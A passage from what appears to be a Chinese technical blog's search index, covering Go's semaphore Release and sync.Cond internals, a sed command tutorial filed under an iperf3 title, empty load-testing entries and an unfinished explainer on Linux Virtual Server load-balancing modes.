class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> Release(n <span class="type">int64</span>) {</span><br><span class="line">    s.mu.Lock()</span><br><span class="line">    <span class="comment">// 将当前计数值减去释放的资源数n</span></span><br><span class="line">    s.cur -= n</span><br><span class="line">    <span class="keyword">if</span> s.cur &lt; <span class="number">0</span> {</span><br><span class="line">      s.mu.Unlock()</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">"semaphore: released more than held"</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 尝试唤醒等待队列中的调用者，看是否有足够的资源被获取</span></span><br><span class="line">    s.notifyWaiters()</span><br><span class="line">    s.mu.Unlock()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-sync.Cond</title>
      <link href="/Code/Code-Golang-Cond/"/>
      <url>/Code/Code-Golang-Cond/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h1 id="Cond"><a href="#Cond" class="headerlink" title="Cond"></a>Cond</h1><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>读写操作都由 <code>sync.Mutex</code> 进行并发安全的保护</p><ul><li>定义一个互斥锁，用于保护共享数据；</li><li>创建一个<code>sync.Cond</code>对象，关联这个互斥锁；</li><li>在需要等待条件变量的地方，获取这个互斥锁，并使用<code>Wait</code>方法等待条件变量被通知；</li><li>在需要通知等待的协程时，使用<code>Signal</code>或<code>Broadcast</code>方法通知等待的协程。</li><li>最后，释放这个互斥锁。</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mutex = sync.Mutex{}</span><br><span class="line"><span class="keyword">var</span> cond = sync.NewCond(&amp;mutex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> queue []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">producer</span><span class="params">()</span></span> {</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> {</span><br><span class="line">mutex.Lock()</span><br><span class="line">queue = <span class="built_in">append</span>(queue, i)</span><br><span class="line">i++</span><br><span class="line">mutex.Unlock()</span><br><span class="line"></span><br><span class="line">cond.Signal()</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(consumerName <span class="type">string</span>)</span></span> {</span><br><span class="line"><span class="keyword">for</span> {</span><br><span class="line">mutex.Lock()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(queue) == <span class="number">0</span> {</span><br><span class="line">cond.Wait()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">fmt.Println(consumerName, queue[<span class="number">0</span>])</span><br><span class="line">queue = queue[<span class="number">1</span>:]</span><br><span class="line">mutex.Unlock()</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="comment">// 开启一个 producer</span></span><br><span class="line"><span class="keyword">go</span> producer()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启两个 consumer</span></span><br><span class="line"><span class="keyword">go</span> consumer(<span class="string">"consumer-1"</span>)</span><br><span class="line"><span class="keyword">go</span> consumer(<span class="string">"consumer-2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> {</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Minute)</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><code>NewCond</code>方法： 提供创建<code>Cond</code>实例的方法。注意该函数需要一个 Locker 作为必填参数，这是因为在 <code>cond.Wait()</code> 中底层会涉及到 Locker 的锁操作。</li><li>Wait<code>方法: 使当前线程进入阻塞状态，等待其他协程唤醒</code>。唤醒期间会解锁并切走 goroutine。</li><li><code>Singal</code>方法: 唤醒一个等待该条件变量的线程，如果没有线程在等待，则该方法会立即返回。</li><li>Broadcast`方法: 唤醒所有等待该条件变量的线程，如果没有线程在等待，则该方法会立即返回。</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Cond <span class="keyword">struct</span> {</span><br><span class="line">   noCopy noCopy</span><br><span class="line">   <span class="comment">// L is held while observing or changing the condition</span></span><br><span class="line">   L Locker</span><br><span class="line"></span><br><span class="line">   notify  notifyList</span><br><span class="line">   checker copyChecker</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCond</span><span class="params">(l Locker)</span></span> *Cond {}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cond)</span></span> Wait() {}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cond)</span></span> Signal() {}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cond)</span></span> Broadcast() {}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> notifyList <span class="keyword">struct</span> {</span><br><span class="line">    wait <span class="type">uint32</span></span><br><span class="line">notify <span class="type">uint32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// List of parked waiters.</span></span><br><span class="line">lock mutex</span><br><span class="line">head *sudog</span><br><span class="line">tail *sudog</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Wait"><a href="#Wait" class="headerlink" title="Wait"></a>Wait</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cond)</span></span> Wait() {</span><br><span class="line">c.checker.check()</span><br><span class="line"><span class="comment">// 获取ticket</span></span><br><span class="line">t := runtime_notifyListAdd(&amp;c.notify)</span><br><span class="line"><span class="comment">// 注意这里，必须先解锁，因为 runtime_notifyListWait 要切走 goroutine</span></span><br><span class="line"><span class="comment">// 所以这里要解锁，要不然其他 goroutine 没法获取到锁了</span></span><br><span class="line">c.L.Unlock()</span><br><span class="line"><span class="comment">// 将当前 goroutine 加入到 notifyList 里面，然后切走 goroutine</span></span><br><span class="line">runtime_notifyListWait(&amp;c.notify, t)</span><br><span class="line"><span class="comment">// 这里已经唤醒了，因此需要再度锁上</span></span><br><span class="line">c.L.Lock()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">notifyListAdd</span><span class="params">(l *notifyList)</span></span> <span class="type">uint32</span> {</span><br><span class="line"><span class="keyword">return</span> atomic.Xadd(&amp;l.wait, <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">notifyListWait</span><span class="params">(l *notifyList, t <span class="type">uint32</span>)</span></span> {</span><br><span class="line">lock(&amp;l.lock)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">s := acquireSudog()</span><br><span class="line">s.g = getg()</span><br><span class="line">s.ticket = t</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> l.tail == <span class="literal">nil</span> {</span><br><span class="line">l.head = s</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">l.tail.next = s</span><br><span class="line">}</span><br><span class="line">l.tail = s</span><br><span class="line"></span><br><span class="line"><span class="comment">// go park 切走 goroutine</span></span><br><span class="line">goparkunlock(&amp;l.lock, waitReasonSyncCondWait, traceEvGoBlockCond, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：这个时候，goroutine 已经切回来了, 释放 sudog</span></span><br><span class="line">releaseSudog(s)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src="/Image/image-cond-wait.png" alt="cond-wait" style="zoom:80%;"><h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>唤醒一个 goroutine，且该 goroutine 是最早 Wait 的, FIFO 式的唤醒。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cond)</span></span> Signal() {</span><br><span class="line">runtime_notifyListNotifyOne(&amp;c.notify)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">notifyListNotifyOne</span><span class="params">(l *notifyList)</span></span> {</span><br><span class="line"><span class="comment">// 如果二者相等，说明没有需要唤醒的 goroutine</span></span><br><span class="line"><span class="keyword">if</span> atomic.Load(&amp;l.wait) == atomic.Load(&amp;l.notify) {</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">lock(&amp;l.lock)</span><br><span class="line"></span><br><span class="line">t := l.notify</span><br><span class="line"><span class="keyword">if</span> t == atomic.Load(&amp;l.wait) {</span><br><span class="line">unlock(&amp;l.lock)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the next notify ticket number.</span></span><br><span class="line">atomic.Store(&amp;l.notify, t+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, s := (*sudog)(<span class="literal">nil</span>), l.head; s != <span class="literal">nil</span>; p, s = s, s.next {</span><br><span class="line"><span class="keyword">if</span> s.ticket == t {</span><br><span class="line">n := s.next</span><br><span class="line"><span class="keyword">if</span> p != <span class="literal">nil</span> {</span><br><span class="line">p.next = n</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">l.head = n</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> n == <span class="literal">nil</span> {</span><br><span class="line">l.tail = p</span><br><span class="line">}</span><br><span class="line">unlock(&amp;l.lock)</span><br><span class="line">s.next = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 唤醒 goroutine</span></span><br><span class="line">readyWithTime(s, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">unlock(&amp;l.lock)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>每次 Wait 的时候，都会同时生成一个 ticket，这个 ticket 作为此次 Wait 的唯一标识。ticket 是由 <code>notifyList.wait</code> 原子递增而来，因此 <code>notifyList.wait</code> 也同时代表当前最大的 ticket。</p><p>那么，每次唤醒的时候，也会对应一个 <code>notify</code> 属性。例如当前 <code>notify</code> 属性等于 1，则去逐个检查 <code>notifyList</code> 链表中 元素，找到 <code>ticket</code> 等于 1 的 goroutine 并唤醒，同时将 <code>notify</code> 属性进行原子递增。</p><p>这是因为 <code>notifyList</code> 会有乱序的可能。从我们上面 Wait 的过程可以看出，获取 <code>ticket</code> 和加入 <code>notifyList</code>，是两个独立的行为，中间会把锁释放掉。而当多个 goroutine 同时进行时，中间会产生进行并发操作，那么有可能后获取 ticket 的 goroutine，先插入到 <code>notifyList</code> 里面, 这就会造成 <code>notifyList</code> 轻微的乱序。Golang 的官方解释如下：</p><blockquote><p>Because g’s queue separately from taking numbers, there may be minor reorderings in the list.</p></blockquote><p>因此，这种 逐个匹配 <code>ticket</code> 的方式 ，即使在 notifyList 乱序的情况下，也能取到最先 Wait 的 goroutine。</p><p>这里有个问题是，对于这种方法我们需要逐个遍历 <code>notifyList</code>, 理论上来说，这是个 <code>O(n)</code> 的线性时间复杂度。Golang 也对这里做了解释：其实大部分场景下只用比较一两次之后就会很快停止，因此不用太担心性能问题。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li><p>sync.Cond不能拷贝，否则将会造成<code>panic("sync.Cond is copied")</code>错误</p></li><li><p>Wait 的调用一定要放在 Lock 和 UnLock 中间，否则将会造成 <code>panic("sync: unlock of unlocked mutex")</code> 错误。代码如下:</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c.L.Lock()</span><br><span class="line"><span class="keyword">for</span> !condition() {</span><br><span class="line">       c.Wait()</span><br><span class="line">}</span><br><span class="line">... <span class="built_in">make</span> use of condition ...</span><br><span class="line">c.L.Unlock()</span><br></pre></td></tr></tbody></table></figure></li><li><p>Wait 调用的条件检查一定要放在 for 循环中，代码如上。这是因为当 Boardcast 唤醒时，有可能其他 goroutine 先于当前 goroutine 唤醒并抢到锁，导致轮到当前 goroutine 抢到锁的时候，条件又不再满足了。因此，需要将条件检查放在 for 循环中。</p></li><li><p>Signal 和 Boardcast 两个唤醒操作不需要加锁。</p></li></ol><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://www.cyhone.com/articles/golang-sync-cond/">https://www.cyhone.com/articles/golang-sync-cond/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具ab</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7ab/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7ab/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具iperf3</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7iperf3/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7iperf3/</url>
      
        <content type="html"><![CDATA[<h2 id="sed是什么"><a href="#sed是什么" class="headerlink" title="sed是什么"></a>sed是什么</h2><p>sed是stream editor的简称，也就是流编辑器。它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，不断重复，直到文件末尾。文件内容不会改变，除非使用重定向输出。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [option] <span class="string">'command'</span> filename</span><br></pre></td></tr></tbody></table></figure><p>常用option：</p><blockquote><p>-n 或–quiet或–silent 仅显示script处理后的结果.</p><p>-e <script>或--expression=<script> 以选项中指定的script来处理输入的文本文件。</p><p>-f <script文件>或--file=<script文件> 以选项中指定的script文件来处理输入的文本文件。</p><p>-r 让sed命令支持扩展的正则表达式(默认是基础正则表达式)。</p></blockquote><p>动作说明：</p><blockquote><p>a: 新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)。</p><p>c: 取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行。</p><p>d: 删除</p><p>i: 插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)。</p><p>p: 打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行</p><p>s: 取代，可以直接进行取代的工作。通常这个 s 的动作可以搭配正则表达式</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>插入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第一行前添加字符串</span></span><br><span class="line">sed <span class="string">&#x27;1i\添加的内容&#x27;</span> file</span><br><span class="line"><span class="comment"># 在最后一行行前添加字符串</span></span><br><span class="line">sed <span class="string">&#x27;$i\添加的内容&#x27;</span> file</span><br><span class="line"><span class="comment"># 在最后一行行后添加字符串</span></span><br><span class="line">sed <span class="string">&#x27;$a\添加的内容&#x27;</span> file</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>替换</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释掉含有“swap”的行</span></span><br><span class="line">sed -i <span class="string">&#x27;s/^[^#].*swap*/#&amp;/g&#x27;</span> fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消含有字符串swap的行最前面的注释符号#</span></span><br><span class="line"><span class="comment">## //两杠表示空格，以空格替换#，等价取消#。</span></span><br><span class="line">sed -i <span class="string">&#x27;/^#.*swap/s/^#//g&#x27;</span> fstab</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除第2行</span></span><br><span class="line">sed <span class="string">&#x27;2d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除1-4行</span></span><br><span class="line">sed <span class="string">&#x27;1,4d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除1行和后2行,共3行</span></span><br><span class="line">sed <span class="string">&#x27;1,+2d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除匹配到Coder的行和其后面的2行</span></span><br><span class="line">sed <span class="string">&#x27;/Coder/,+2d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除奇数行</span></span><br><span class="line">sed <span class="string">&#x27;1~2d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除偶数行</span></span><br><span class="line">sed <span class="string">&#x27;2~2d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除匹配Coder的行</span></span><br><span class="line">sed <span class="string">&#x27;/Coder/d&#x27;</span> filename</span><br><span class="line"><span class="comment"># 删除所有空行</span></span><br><span class="line">sed <span class="string">&#x27;/^$/d&#x27;</span> filename</span><br></pre></td></tr></table></figure></li></ul></script></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具wrk</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7wrk/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7wrk/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux virtual server (LVS)</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-Linux-LVS/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-Linux-LVS/</url>
      
        <content type="html"><![CDATA[<p>LVS是Linux virtual server的缩写，为linux虚拟服务器，是一个虚拟的服务器集群系统。LVS简单工作原理为用户请求LVS VIP，LVS根据转发方式和算法，将请求转发给后端服务器，后端服务器接收到请求，返回给用户。对于用户来说，看不到Web后端具体的应用。</p><h4 id="LVS集群三层结构"><a href="#LVS集群三层结构" class="headerlink" title="LVS集群三层结构"></a>LVS集群三层结构</h4><ul><li>负载调度器(Load Balancer):LVS集群对外的前端机器，负责将client的请求发送到一组服务器上执行，而client认为返回来的数据来自同一个IP</li><li>服务器池(Server Pool):正在执行client请求的服务器，一般是web服务器。还有FTP，MAIL，DNS等。</li><li>共享存储(Shared stord):为Server Pool提供一个共享的存储区，让服务器池拥有相同的内筒，提供相同的服务。</li></ul><h4 id="LVS相关概念"><a href="#LVS相关概念" class="headerlink" title="LVS相关概念"></a>LVS相关概念</h4><ul><li>DS：Director Server。指前段负载均衡器</li><li>RS：Real Server。后端服务器</li><li>VIP：向外部直接面向用户请求，作为用户请求的目标的IP地址</li><li>DIP：Director Server IP，主要用于和内部主机通讯的IP地址</li><li>RIP：Real Server IP，后端服务器的IP地址</li><li>CIP：Client IP，访问客户端的IP地址</li></ul><h4 id="LVS四种负载均衡模式"><a href="#LVS四种负载均衡模式" class="headerlink" title="LVS四种负载均衡模式"></a>LVS四种负载均衡模式</h4><h5 id="DR模式"><a href="#DR模式" class="headerlink" title="DR模式"></a>DR模式</h5><p>负载均衡器和 RS 都使用同一个 IP 对外服务，但只有负载均衡器对 ARP 请求进行响应。负载均衡器收到数据包后根据调度算法，找出对应的 RS, 把目的 MAC 地址改为 RS 的 MAC (IP 一致), 并将请求分发给这台 RS.RS 收到数据包并处理完成之后，由于 IP 一致，可以直接将数据返给客户端，与直接从客户端收到这个数据包无异，处理后直接返回给客户端</p><ol><li>客户端将请求发往前端的负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器将客户端请求报文的源 MAC 地址改为自己的 MAC 地址，目标 MAC 改为了 RS 的 MAC 地址，并将此包发送给 RS</li><li>处理完请求报文后，由于 RS 与 负载均衡器有具有同一 VIP, 会将响应报文直接发送给客户端</li></ol><p>![image-20230306142102784](/Users/suhang/Library/Application Support/typora-user-images/image-20230306142102784.png)</p><ul><li>优点：与隧道模式一样，负载均衡器也只是分发请求，应答包通过单独的路由方法返回给客户端。同时，不需要隧道结构，可以使用大多数服务器作为 RS</li><li>缺点：要求 VIP 必须与物理网卡在一个物理段上，否则 ARP 不能寻到不同网段的 MAC 地址。也就是说所有 RS 节点和调度器 LB 只能在一个局域网里面</li></ul><h5 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h5><p>NAT (Network Address Translation) 即网络地址转换，包括 SNAT (源地址转换) 与 DNAT (目标地址转换). 它通过修改请求报文的目标 IP 地址 (同时可能会修改目标端口) 挑选出某台 Real Server 的 RIP 地址实现转发。在请求与响应过程中期间，无论是进来的流量，还是出去的流量，都必须经过 LVS 负载均衡器.</p><ol><li>客户端将请求发往负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器通过地址转换，将客户端发来的数据包转发至后端 RIP</li><li>RS 处理完成后响应对负载均衡器返回响应数据</li><li>负载均衡器通过地址转换，将 RS 的响应数据响应给客户端</li></ol><p>![image-20230306141507935](/Users/suhang/Library/Application Support/typora-user-images/image-20230306141507935.png)</p><blockquote><p>注意: RIP 与 DIP 需要在同一网络，且 RIP 网关必须指向 DIP</p></blockquote><ul><li>优点：只需要暴露出一个 VIP 地址即可，对用户来说后端服务器是完全透明的</li><li>缺点：当 RS 节点增长过多时，负载均衡器将成为性能瓶颈，速度会变慢</li></ul><h5 id="TUN模式"><a href="#TUN模式" class="headerlink" title="TUN模式"></a>TUN模式</h5><p>负载均衡器把客户端发来的数据包，封装一个新的 IP 头标记 (仅目的 IP) 发给 RS.RS 收到后，先把数据包的头解开，还原数据包，处理后，直接返回给客户端，不需要再经过负载均衡器</p><ol><li>客户端将请求发往负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器将在客户端请求报文的首部再封装一层 IP 报文，将源地址改为 DIP, 目标地址改为 RIP, 并通过 IP 隧道技术将报文发给 RS</li><li>RS 收到后，先把数据包头解开，还原数据包，处理后，直接返回给客户端，不需要再经过负载均衡器</li></ol><p>![image-20230306141734441](/Users/suhang/Library/Application Support/typora-user-images/image-20230306141734441.png)</p><ul><li>优点：减少负载均衡器压力，负载均衡器不再是系统的瓶颈，能够处理更多的请求流量</li><li>缺点: RS 节点需要合法 IP, 且需要所有服务器支持 <code>IP Tunneling</code>(IP Encapsulation) 协议，因此服务器可能只局限于部分 Linux 系统上</li></ul><h5 id="FULLNAT模式"><a href="#FULLNAT模式" class="headerlink" title="FULLNAT模式"></a>FULLNAT模式</h5><h5 id="四种模式比较"><a href="#四种模式比较" class="headerlink" title="四种模式比较"></a>四种模式比较</h5><h4 id="LVS负载均衡常见算法"><a href="#LVS负载均衡常见算法" class="headerlink" title="LVS负载均衡常见算法"></a>LVS负载均衡常见算法</h4><ul><li>轮训调度<ul><li>按依次循环的方式将请求调度到不同的服务器上，该算法大的特点就是实现简单。轮询算法假设所有的服务器处理请求的能力都一样的，调度器会将所有的请求平均分配给每个真实服务器。</li></ul></li><li>加权轮训调度<ul><li>Weight Round Robin 简称WRR，轮询算法的一种优化与补充，LVS会考虑每台服务器的性能，并给每台服务器添加一个权值，如果服务器A的权值为1，服务器B的权值为2，则调度器调度到服务器B的请求会是服务器A的两倍。权值越高的服务器，处理的请求越多。</li></ul></li><li>最小连接调度<ul><li>Least Connections 简称LC，算法是把新的连接请求分配到当前连接数小的服务器。小连接调度是一种动态的调度算法，它通过服务器当前活跃的连接数来估计服务器的情况。调度器需要记录各个服务器已建立连接的数目，当一个请求被调度到某台服务器，其连接数加1;当连接中断或者超时，其连接数减1。</li></ul></li><li>加权小连接调度<ul><li>Weight Least Connections 